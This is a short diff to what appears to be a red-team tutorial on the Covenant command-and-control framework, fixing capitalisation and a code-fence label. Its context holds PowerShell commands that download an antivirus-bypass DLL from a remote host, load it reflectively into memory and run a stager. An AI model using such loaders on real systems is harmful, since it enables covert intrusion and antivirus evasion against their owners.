@@ -666,10 +666,10 @@ And note your new powershell Grunt checking in on Covenant.
 </p>
 
 
-we could also download the DLL from a remote location as follow below:
+We could also download the DLL from a remote location as follow below:
 
 
-```poershell 
+```powershell 
 PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
 PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
